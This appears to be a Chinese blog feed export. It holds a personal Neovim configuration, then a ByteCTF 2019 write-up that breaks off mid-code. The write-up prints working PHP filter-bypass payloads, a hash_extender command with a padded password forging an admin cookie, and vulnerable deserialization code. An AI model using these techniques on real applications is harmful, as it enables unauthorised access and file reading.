<h2 id="以下内容是配置">以下内容是配置</h2>
<h3 id="安装（vim-plug）">安装（vim-plug）</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -fLo ~/.local/share/nvim/site/autoload/plug.vim --create-dirs \</span><br><span class="line">    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span><br></pre></td></tr></table></figure>
<h3 id="config-nvim-init-vim">~/.config/nvim/init.vim</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">" c to caplock , add XKBOPTIONS="caps:escape" in /etc/default/keyboard</span><br><span class="line"></span><br><span class="line">" 让进入vim的时候显示绝对行号,当进入编辑模式的时候也显示绝对行号,但是从编辑模式回到普通模式的时候切换到相对行号</span><br><span class="line">set number</span><br><span class="line">augroup relative_numbser</span><br><span class="line"> autocmd!</span><br><span class="line"> autocmd InsertEnter * :set norelativenumber</span><br><span class="line"> autocmd InsertLeave * :set relativenumber</span><br><span class="line">augroup END</span><br><span class="line"></span><br><span class="line">set wildmenu</span><br><span class="line">" 忽略大小写</span><br><span class="line">set ignorecase</span><br><span class="line">set shell=/bin/zsh</span><br><span class="line"></span><br><span class="line">" font and icons for vim</span><br><span class="line">set encoding=utf8</span><br><span class="line">" set guifont=DroidSansMono\ Nerd\ Font\ 11</span><br><span class="line">autocmd User Startified setlocal buflisted</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">" leader键映射</span><br><span class="line">let mapleader="\&lt;Space&gt;"</span><br><span class="line">map &lt;leader&gt;w :w&lt;CR&gt;</span><br><span class="line">map &lt;leader&gt;q :q!&lt;CR&gt;</span><br><span class="line">map &lt;leader&gt;r :call Runit()&lt;CR&gt;</span><br><span class="line">" 设定函数,自动根据文件类型来调用相应的解释器来执行代码</span><br><span class="line">func Runit()</span><br><span class="line">    if &amp;filetype == 'php'</span><br><span class="line">	exec "!time php %"</span><br><span class="line">    elseif &amp;filetype == 'python'</span><br><span class="line">	exec "!time python %"</span><br><span class="line">    elseif &amp;filetype == 'c'</span><br><span class="line">	exec "!gcc % -o %&lt;"</span><br><span class="line">	exec "!time sudo ./%&lt;"</span><br><span class="line">    elseif &amp;filetype == 'cpp'</span><br><span class="line">	exec "!g++ % -o %&lt;"</span><br><span class="line">	exec "!time ./%&lt;"</span><br><span class="line">    endif</span><br><span class="line">endfunc</span><br><span class="line">"</span><br><span class="line">" set shift width</span><br><span class="line">set shiftwidth=4</span><br><span class="line">set scrolloff=6</span><br><span class="line">" 启动鼠标</span><br><span class="line">set mouse=n</span><br><span class="line"></span><br><span class="line">map &lt;ScrollWheelUp&gt; &lt;C-Y&gt;</span><br><span class="line">map &lt;ScrollWheelDown&gt; &lt;C-E&gt;</span><br><span class="line"></span><br><span class="line">" 关于多窗口的键位映射</span><br><span class="line">map vs :vs </span><br><span class="line">map sp :sp </span><br><span class="line">map &lt;leader&gt;l &lt;C-w&gt;l</span><br><span class="line">map &lt;leader&gt;h &lt;C-w&gt;h</span><br><span class="line">map &lt;leader&gt;j &lt;C-w&gt;j</span><br><span class="line">map &lt;leader&gt;k &lt;C-w&gt;k</span><br><span class="line"></span><br><span class="line">map &lt;leader&gt;L &lt;C-w&gt;L</span><br><span class="line">map &lt;leader&gt;H &lt;C-w&gt;H</span><br><span class="line">map &lt;leader&gt;J &lt;C-w&gt;J</span><br><span class="line">map &lt;leader&gt;K &lt;C-w&gt;K</span><br><span class="line"></span><br><span class="line">" 终端模式</span><br><span class="line">map te :vs&lt;CR&gt;&lt;C-w&gt;L:te&lt;CR&gt;A</span><br><span class="line">tnoremap &lt;esc&gt; &lt;C-\&gt;&lt;C-n&gt;</span><br><span class="line"></span><br><span class="line">" 关于多标签模式的设定</span><br><span class="line">map tn :tabnew </span><br><span class="line">map L :tabnext&lt;CR&gt;</span><br><span class="line">map H :tabprev&lt;CR&gt;</span><br><span class="line"></span><br><span class="line">" 代码折叠</span><br><span class="line">set foldmethod=indent</span><br><span class="line">set foldlevel=99</span><br><span class="line"></span><br><span class="line">"</span><br><span class="line">" 高亮当前的行和列</span><br><span class="line">set cursorcolumn</span><br><span class="line">set cursorline</span><br><span class="line">highlight CursorLine   cterm=NONE ctermbg=black ctermfg=green</span><br><span class="line">highlight CursorColumn cterm=NONE ctermbg=black ctermfg=green </span><br><span class="line"></span><br><span class="line">" 这段代码可以让每次打开文件的时候将光标定位到上一次所在的位置</span><br><span class="line">au BufReadPost * if line("'\"") &gt; 1 &amp;&amp; line("'\"") &lt;= line("$") | exe "normal! g'\"" | endif</span><br><span class="line"></span><br><span class="line">" 引入插件</span><br><span class="line">source ~/.vim/plugins.vim</span><br><span class="line">" 这个是为了在编写python的时候方便在vim内部浏览python文档而添加的，在github上有</span><br><span class="line">" source ~/.vim/pydoc.vim/ftplugin/python_pydoc.vim</span><br></pre></td></tr></table></figure>
<h3 id="vim-plugins-vim">~/.vim/plugins.vim</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">call plug#begin(&apos;~/.vim/plugged&apos;)</span><br><span class="line"></span><br><span class="line">&quot; 代码补全插件</span><br><span class="line">&quot; Plug &apos;neoclide/coc.nvim&apos;, &#123;&apos;branch&apos;: &apos;release&apos;&#125;</span><br><span class="line">Plug &apos;ncm2/ncm2&apos;</span><br><span class="line">Plug &apos;ncm2/ncm2-jedi&apos; </span><br><span class="line">Plug &apos;ncm2/ncm2-bufword&apos;</span><br><span class="line">Plug &apos;ncm2/ncm2-path&apos;</span><br><span class="line">Plug &apos;roxma/nvim-yarp&apos;</span><br><span class="line">Plug &apos;phpactor/phpactor&apos; ,  &#123;&apos;do&apos;: &apos;composer install&apos;, &apos;for&apos;: &apos;php&apos;&#125;</span><br><span class="line">Plug &apos;phpactor/ncm2-phpactor&apos;</span><br><span class="line">&quot; 外观插件</span><br><span class="line">Plug &apos;KeitaNakamura/neodark.vim&apos;</span><br><span class="line">Plug &apos;cocopon/iceberg.vim&apos;</span><br><span class="line">Plug &apos;vim-airline/vim-airline&apos;</span><br><span class="line">Plug &apos;ryanoasis/vim-devicons&apos;</span><br><span class="line">&quot; 代码结构显示</span><br><span class="line">Plug &apos;vim-scripts/taglist.vim&apos;</span><br><span class="line">&quot; 代码标记,并且可以在标记之间跳转</span><br><span class="line">Plug &apos;MattesGroeger/vim-bookmarks&apos;</span><br><span class="line">&quot; 目录树</span><br><span class="line">Plug &apos;scrooloose/nerdtree&apos;</span><br><span class="line">&quot; 括号自动补全</span><br><span class="line">Plug &apos;jiangmiao/auto-pairs&apos;</span><br><span class="line">&quot; 快速注释</span><br><span class="line">Plug &apos;scrooloose/nerdcommenter&apos;</span><br><span class="line"> &quot; 花里胡哨的小插件，可以让打字发出音乐</span><br><span class="line">&quot; Plug &apos;skywind3000/vim-keysound&apos;</span><br><span class="line">call plug#end()</span><br><span class="line"></span><br><span class="line">&quot; Plugin setting</span><br><span class="line">&quot;</span><br><span class="line">source /home/ch4ser/.vim/plugset/nerdtree.vim</span><br><span class="line">source /home/ch4ser/.vim/plugset/ncm2.vim</span><br><span class="line">source /home/ch4ser/.vim/plugset/bookmark.vim</span><br><span class="line">source /home/ch4ser/.vim/plugset/airline.vim</span><br><span class="line">source /home/ch4ser/.vim/plugset/taglists.vim</span><br><span class="line">source /home/ch4ser/.vim/plugset/autopair.vim</span><br><span class="line">source /home/ch4ser/.vim/plugset/nerdcomment.vim</span><br><span class="line">&quot; source ~/.vim/plugset/keysound.vim</span><br></pre></td></tr></table></figure>
<h4 id="vim-plugset-ncm2-vim">~/.vim/plugset/ncm2.vim</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inoremap &lt;expr&gt; &lt;Tab&gt; pumvisible() ? &quot;\&lt;C-n&gt;&quot; : &quot;\&lt;Tab&gt;&quot;</span><br><span class="line">inoremap &lt;expr&gt; &lt;S-Tab&gt; pumvisible() ? &quot;\&lt;C-p&gt;&quot; : &quot;\&lt;S-Tab&gt;&quot;</span><br><span class="line">inoremap &lt;expr&gt; &lt;CR&gt; (pumvisible() ? &quot;\&lt;c-y&gt;\&lt;cr&gt;&quot;: &quot;\&lt;CR&gt;&quot;)</span><br><span class="line">autocmd BufEnter * call ncm2#enable_for_buffer()</span><br><span class="line">set completeopt=noinsert,menuone,noselect</span><br><span class="line">let ncm2#popup_delay = 5</span><br><span class="line">let g:ncm2#matcher = &quot;substrfuzzy&quot;</span><br><span class="line">let g:ncm2_jedi#python_version = 3</span><br><span class="line">let g:ncm2#match_highlight = &apos;sans-serif&apos;</span><br></pre></td></tr></table></figure>
<h4 id="vim-plugset-airline-vim">~/.vim/plugset/airline.vim</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;if you want to enable solarized theme ,quote the snipeet</span><br><span class="line">&quot; 这段代码让vim支持插件所需的色彩</span><br><span class="line">if (empty($TMUX))</span><br><span class="line">  if (has(&quot;nvim&quot;))</span><br><span class="line">    &quot;For Neovim 0.1.3 and 0.1.4 &lt; https://github.com/neovim/neovim/pull/2198 &gt;</span><br><span class="line">    let $NVIM_TUI_ENABLE_TRUE_COLOR=1</span><br><span class="line">  endif</span><br><span class="line">  &quot;For Neovim &gt; 0.1.5 and Vim &gt; patch 7.4.1799 &lt; https://github.com/vim/vim/commit/61be73bb0f965a895bfb064ea3e55476ac175162 &gt;</span><br><span class="line">  &quot;Based on Vim patch 7.4.1770 (`guicolors` option) &lt; https://github.com/vim/vim/commit/8a633e3427b47286869aa4b96f2bfc1fe65b25cd &gt;</span><br><span class="line">  &quot; &lt; https://github.com/neovim/neovim/wiki/Following-HEAD#20160511 &gt;</span><br><span class="line">  if (has(&quot;termguicolors&quot;))</span><br><span class="line">    set termguicolors</span><br><span class="line">  endif</span><br><span class="line">endif</span><br><span class="line"></span><br><span class="line">&quot;airline setting </span><br><span class="line">let g:airline_symbols = &#123;&#125;</span><br><span class="line">let g:airline_left_sep = &apos;&apos;</span><br><span class="line">let g:airline_left_alt_sep = &apos;&apos;</span><br><span class="line">let g:airline_right_sep = &apos;&apos;</span><br><span class="line">let g:airline_right_alt_sep = &apos;&apos;</span><br><span class="line">let g:airline_symbols.branch = &apos;&apos;</span><br><span class="line">let g:airline_symbols.readonly = &apos;&apos;</span><br><span class="line">let g:airline_symbols.linenr = &apos;&apos;</span><br><span class="line">let g:airline#extensions#tabline#enabled = 1</span><br><span class="line">let g:airline#extensions#tabline#show_buffers = 0</span><br><span class="line">let g:airline#extensions#tabline#show_tabs = 1</span><br><span class="line">let g:airline#extensions#tabline#fnamemod = &apos;:t&apos;</span><br><span class="line">let g:airline#extensions#tabline#left_sep = &apos; &apos;</span><br><span class="line">let g:airline#extensions#tabline#left_alt_sep = &apos;|&apos;</span><br><span class="line">&quot;</span><br><span class="line">&quot; 主题设置</span><br><span class="line">&quot; color schema</span><br><span class="line">&quot;主题设置为冰山主题</span><br><span class="line">&quot; colorscheme iceberg </span><br><span class="line">&quot; let g:airline_theme=&apos;iceberg&apos;</span><br><span class="line">&quot; let g:lightline = &#123;&apos;colorscheme&apos;: &apos;iceberg&apos;&#125;</span><br><span class="line">&quot;</span><br><span class="line">&quot; 设置主题为onedark</span><br><span class="line">colorscheme neodark</span><br></pre></td></tr></table></figure>
<h4 id="vim-plugset-nerdcomment-vim">~/.vim/plugset/nerdcomment.vim</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; comment plugin setting</span><br><span class="line">&quot;comment followed a space</span><br><span class="line">let g:NERDSpaceDelims=1</span><br></pre></td></tr></table></figure>
<h4 id="vim-plugset-autopair-vim">~/.vim/plugset/autopair.vim</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; autopair setting</span><br><span class="line">let g:AutoPairsShortcutJump = &apos;&lt;S-Tab&gt;&apos;</span><br><span class="line">let g:AutoPairsShortcutFastWrap=&apos;&lt;C-z&gt;&apos;</span><br></pre></td></tr></table></figure>
<h4 id="vim-plugset-nerdtree-vim">~/.vim/plugset/nerdtree.vim</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; T                 打开nerdree窗口，在左侧栏显示</span><br><span class="line">map T :NERDTreeToggle&lt;CR&gt;&lt;leader&gt;l</span><br><span class="line"></span><br><span class="line">&quot;close vim if the only window left open is a NERDTree</span><br><span class="line">autocmd bufenter * if (winnr(&quot;$&quot;) == 1 &amp;&amp; exists(&quot;b:NERDTree&quot;) &amp;&amp; b:NERDTree.isTabTree()) | q | endif</span><br></pre></td></tr></table></figure>
<h4 id="vim-plugset-keysound-vim">~/.vim/plugset/keysound.vim</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;launch with vim</span><br><span class="line">let g:keysound_enable = 1</span><br><span class="line"></span><br><span class="line">&quot;set default sound</span><br><span class="line">let g:keysound_theme = &apos;default&apos;</span><br><span class="line">&quot; let g:keysound_theme = &apos;typewriter&apos;</span><br><span class="line">&quot; let g:keysound_theme = &apos;sword&apos;</span><br><span class="line">&quot; let g:keysound_theme = &apos;mario&apos;</span><br><span class="line">&quot; let g:keysound_theme = &apos;bubble&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot; set python version</span><br><span class="line">let g:keysound_py_version = 2</span><br><span class="line"></span><br><span class="line">&quot;volumn setting</span><br><span class="line">&quot; 其实设置这么大,早就超过极限了</span><br><span class="line">let g:keysound_volumn = 100000</span><br></pre></td></tr></table></figure>
<h3 id="vim-plugset-taglists-vim">~/.vim/plugset/taglists.vim</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">map &lt;leader&gt;t :TlistToggle&lt;CR&gt; &quot;设置召唤键</span><br><span class="line">let Tlist_WinWidth=30        &quot;设置taglist宽度</span><br><span class="line">let Tlist_Exit_OnlyWindow=1  &quot;tagList窗口是最后一个窗口，则退出Vim</span><br><span class="line">let Tlist_Use_Right_Window   = 0</span><br><span class="line"></span><br><span class="line">&quot; 不同时显示多个文件的 tag ，只显示当前文件的</span><br><span class="line"></span><br><span class="line">&quot; let Tlist_Show_One_File=1</span><br><span class="line"></span><br><span class="line">&quot;让当前不被编辑的文件的方法列表自动折叠起来</span><br><span class="line"></span><br><span class="line">let Tlist_File_Fold_Auto_Close=1</span><br></pre></td></tr></table></figure>
<h3 id="vim-plugset-bookmark-vim">~/.vim/plugset/bookmark.vim</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let g:bookmark_sign = &apos;&gt;&gt;&apos;</span><br><span class="line">let g:bookmark_highlight_lines = 1</span><br><span class="line">&quot; unmap mp</span><br><span class="line">nmap mN &lt;Plug&gt;BookmarkPrev</span><br></pre></td></tr></table></figure>
<h2 id="源码审计">源码审计</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install ctags</span><br><span class="line">#切到待审计文件夹下的根目录下,执行</span><br><span class="line">ctags -R</span><br><span class="line">生成全局的标签文件</span><br><span class="line">然后我们进入一个代码文件,光标放在某一个函数名或者是宏上,按下Ctrl + ], vim就可以自动切换到该函数定义处,要返回只需要按下Ctrl + o  或者 Ctrl + t</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install xcape</span><br><span class="line"># make CapsLock behave like Ctrl:</span><br><span class="line">setxkbmap -option ctrl:nocaps</span><br><span class="line"># make short-pressed Ctrl behave like Escape:</span><br><span class="line">xcape -e &apos;Control_L=Escape&apos;</span><br></pre></td></tr></table></figure>
<p>see the link below:</p>
<p><a href="http://tiborsimko.org/capslock-escape-control.html" target="_blank" rel="noopener">http://tiborsimko.org/capslock-escape-control.html</a></p>
<p>由于这样的做法会让caplock反应变慢,因此我不用这种方法,而是传统的修改keyboard文件来达到简单的esc映射效果.</p>
]]></content>
      <categories>
        <category>闲来无事</category>
      </categories>
  </entry>
  <entry>
    <title>bytectf2019</title>
    <url>/2019/09/09/bytectf2019-working/</url>
    <content><![CDATA[<h2 id="boring-code">boring code</h2>
<p>source code</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/data:\/\//i'</span>, $url)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_valid_url($url)) &#123;</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/baidu\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error: host not allowed"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error: invalid url"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>思路: <a href="http://xn--xxxxbaidu-u75noof94aqu3g.com" target="_blank" rel="noopener">注册一个xxxxbaidu.com</a> 形式的域名.绑定到服务器上后放上自己的代码,payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))readfile(end(scandir(chr(ord(strrev(crypt(serialize(array()))))))));</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>
<p>这两个payload都很精彩, 涉及的知识点如下:</p>
<ul>
<li>
<p>crypt 函数没有key的时候随机生成key进行加密, 如果多尝试几次加密的话就会发现有几次的加密结果中的末尾有点号.</p>
</li>
<li>
<p>ord函数传入字符串的时候, 只返回第一个字符的ascii码</p>
</li>
<li>
<p>localeconv函数返回一组包含本地数字和货币格式的数组, 数组第一位是&quot;小数点字符&quot;,  也就是点号</p>
</li>
<li>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(localeconv());</span><br><span class="line">array(18) &#123;</span><br><span class="line">  [&quot;decimal_point&quot;]=&gt;</span><br><span class="line">  string(1) &quot;.&quot;</span><br><span class="line">  [&quot;thousands_sep&quot;]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;int_curr_symbol&quot;]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;currency_symbol&quot;]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;mon_decimal_point&quot;]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;mon_thousands_sep&quot;]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;positive_sign&quot;]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;negative_sign&quot;]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;int_frac_digits&quot;]=&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;frac_digits&quot;]=&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;p_cs_precedes&quot;]=&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;p_sep_by_space&quot;]=&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;n_cs_precedes&quot;]=&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;n_sep_by_space&quot;]=&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;p_sign_posn&quot;]=&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;n_sign_posn&quot;]=&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;grouping&quot;]=&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;mon_grouping&quot;]=&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">php &gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>pos() 函数是current函数的别名</p>
</li>
<li>
<p>time() 返回时间戳整数, 从中无法提出点号</p>
</li>
<li>
<p>localtime第一参数默认是time(), 不能接受布尔值也就是chdir的返回值</p>
</li>
<li>
<p>localtime() 返回数组来表示当前时间, 第一项是当前的秒数, 要让chr转换成点号的话就要在第46秒执行</p>
</li>
</ul>
<h2 id="ezCMS">ezCMS</h2>
<p>源码<code>www.zip</code>, 关键代码如下:</p>
<p>身份验证部分</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function login()&#123;</span><br><span class="line">    $secret = &quot;********&quot;;</span><br><span class="line">    setcookie(&quot;hash&quot;, md5($secret.&quot;adminadmin&quot;));</span><br><span class="line">    return 1;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">function is_admin()&#123;</span><br><span class="line">    $secret = &quot;********&quot;;</span><br><span class="line">    $username = $_SESSION[&apos;username&apos;];</span><br><span class="line">    $password = $_SESSION[&apos;password&apos;];</span><br><span class="line">    if ($username == &quot;admin&quot; &amp;&amp; $password != &quot;admin&quot;)&#123;</span><br><span class="line">        if ($_COOKIE[&apos;user&apos;] === md5($secret.$username.$password))&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以明显看出这里有哈希长度扩展攻击.</p>
<p>哈希生成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./hash_extender -d &apos;admin&apos; -s 52107b08c0f3342d2153ae1d68e6262c -f md5 -a &apos;ch4ser&apos; --out-data-format=html -l 13 --quiet</span><br></pre></td></tr></table></figure>
<p>得到了新的哈希值,添加到cookie[user]中</p>
<p>然后新的登录用户名: admin</p>
<p>用户密码:admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00ch4ser</p>
<p>第二部分反序列化代码审计.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $content = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        $black_list = [<span class="string">'system'</span>,<span class="string">'eval'</span>,<span class="string">'exec'</span>,<span class="string">'+'</span>,<span class="string">'passthru'</span>,<span class="string">'`'</span>,<span class="string">'assert'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($black_list <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">            <span class="keyword">if</span> (stripos($content, $v) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"your file make me scare"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $filepath;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $filepath)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filepath = $filepath;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_detail</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i'</span>, <span class="keyword">$this</span>-&gt;filepath))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"nonono~"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $mine = mime_content_type(<span class="keyword">$this</span>-&gt;filepath);</span><br><span class="line">        $store_path = <span class="keyword">$this</span>-&gt;open(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;filepath);</span><br><span class="line">        $res[<span class="string">'mine'</span>] = $mine;</span><br><span class="line">        $res[<span class="string">'store_path'</span>] = $store_path;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename, $filepath)</span></span>&#123;</span><br><span class="line">        $res = <span class="string">"$filename is in $filepath"</span>;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;checker))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;upload_file();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $size;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $file_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_dir;</span><br><span class="line">    <span class="keyword">public</span> $content_check;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $file_tmp, $size)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;upload_dir = <span class="string">'sandbox/'</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">        <span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;upload_dir))&#123;</span><br><span class="line">            mkdir(<span class="keyword">$this</span>-&gt;upload_dir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!is_file(<span class="keyword">$this</span>-&gt;upload_dir.<span class="string">'/.htaccess'</span>))&#123;</span><br><span class="line">            file_put_contents(<span class="keyword">$this</span>-&gt;upload_dir.<span class="string">'/.htaccess'</span>, <span class="string">'lolololol, i control all'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;size = $size;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_tmp = $file_tmp;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content_check = <span class="keyword">new</span> Check(<span class="keyword">$this</span>-&gt;file_tmp);</span><br><span class="line">        $profile = <span class="keyword">new</span> Profile();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = $profile-&gt;is_admin();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_file</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'u r not admin'</span>);</span><br><span 